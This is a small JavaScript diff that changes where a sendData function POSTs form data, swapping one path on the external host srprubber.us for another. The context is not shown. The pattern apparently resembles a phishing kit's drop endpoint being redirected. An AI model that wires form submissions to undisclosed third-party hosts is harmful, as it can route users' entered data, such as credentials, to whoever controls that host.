@@ -71,7 +71,7 @@ function sendData( data ) {
   } );
 
   // Set up our request
-  XHR.open( 'POST', 'https://srprubber.us/ademi/' );
+  XHR.open( 'POST', 'https://srprubber.us/fola-w/' );
 
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);
